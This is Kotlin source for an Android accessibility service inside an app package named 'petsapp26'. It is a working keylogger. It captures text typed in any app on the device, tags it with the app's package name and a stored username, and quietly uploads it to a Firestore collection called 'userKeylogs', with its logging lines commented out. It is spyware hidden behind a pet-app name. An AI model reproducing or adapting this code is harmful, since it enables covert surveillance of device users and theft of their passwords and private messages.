package com.example.petsapp26

import android.os.Handler
import android.os.Looper
import android.util.Log
import android.content.Context
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.firestore.FieldValue
import com.google.firebase.ktx.Firebase
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ktx.firestore
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MyAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastTextEntryTime: Long = 0
    private val debounceDelay: Long = 2000 // Delay in milliseconds
    private var lastText: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent) {

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val currentTime = System.currentTimeMillis()

            // Check the delay from the last text entry
            if (currentTime - lastTextEntryTime > debounceDelay || lastText != event.text.toString()) {
                lastTextEntryTime = currentTime
                lastText = event.text.toString()

                // Cancel any existing callbacks
                handler.removeCallbacksAndMessages(null)

                // Post a new delayed task to save the keylog
                handler.postDelayed({
                    saveKeylog(event)
                }, debounceDelay)
            }
        }

        //val eventType = event.eventType
        //val eventText = when (eventType) {
            //AccessibilityEvent.TYPE_VIEW_CLICKED -> "Clicked: "
            //AccessibilityEvent.TYPE_VIEW_FOCUSED -> "Focused: "
            //AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "Typed: "
            //else -> ""
        //} + event.text.joinToString(" ")

        // Print the typed text in the logcat. Or do anything you want here.
        //Log.d("ACCESSIBILITY SERVICE", eventText)

    }

    private fun saveKeylog(event: AccessibilityEvent) {
        val packageName = event.packageName.toString()
        val keylogContent = event.text.joinToString("")
        val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
        val timeFormat = SimpleDateFormat("yyyyMMddHHmmssSSS", Locale.getDefault())
        val date = dateFormat.format(Date()) // e.g., "2024-03-28"
        val time = timeFormat.format(Date()) // Document ID as "yyyyMMddHHmmssSSS"
        val username = getUsername() ?: "No Username"

        // Log to confirm the save action
        //Log.d("ACCESSIBILITY SERVICE", "Saving to Firestore: $keylogContent")

        // Prepare the data to be saved
        val keylogData = hashMapOf(
            "packageName" to packageName,
            "keylogContent" to keylogContent,
            "timestamp" to FieldValue.serverTimestamp()
        )

        // Save the data to Firestore
        Firebase.firestore.collection("userKeylogs").document(date)
            .collection(username).document(time).set(keylogData)
            .addOnSuccessListener {
                //Log.d("Firestore", "DocumentSnapshot successfully written!")
            }
            .addOnFailureListener { e ->
                //Log.w("Firestore", "Error writing document", e)
            }
    }

    private fun getUsername(): String? {
        // Retrieve the username from SharedPreferences
        val sharedPref = getSharedPreferences("AppPreferences", Context.MODE_PRIVATE)
        return sharedPref.getString("username", null)
    }

    override fun onInterrupt() {
        // Handle interruption, such as cleaning up resources.
    }

    override fun onServiceConnected() {
        // Configure our Accessibility service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
            notificationTimeout = 100
        }
        this.serviceInfo = info
    }
}

data class userKeylogs(
    val packageName: String,
    val keylogContent: String,
    val timestamp: com.google.firebase.Timestamp
)